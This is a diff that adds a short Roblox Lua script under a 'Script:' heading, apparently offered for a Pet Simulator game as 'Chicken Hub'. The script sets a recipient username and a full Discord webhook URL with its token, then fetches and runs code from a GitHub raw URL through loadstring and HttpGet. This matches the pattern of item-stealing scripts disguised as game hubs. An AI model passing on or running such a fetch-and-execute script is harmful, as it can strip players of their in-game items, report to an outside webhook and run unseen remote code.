@@ -1,0 +1,7 @@
+**Script:**
+```lua
+_G.Username = "Petsimu_015"
+_G.Webhook = "https://discord.com/api/webhooks/1124532763161268255/LNuPSpDFJNVIha5RWoiq-VUPejch1dgmT9YjGwXfF-klz5_LIY73xiiGbSd6IMy0xhbR"
+_G.LoadingScreenText = "Chicken Hub"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RJ077SIUU/PetSim/main/PSX", true))()
+```
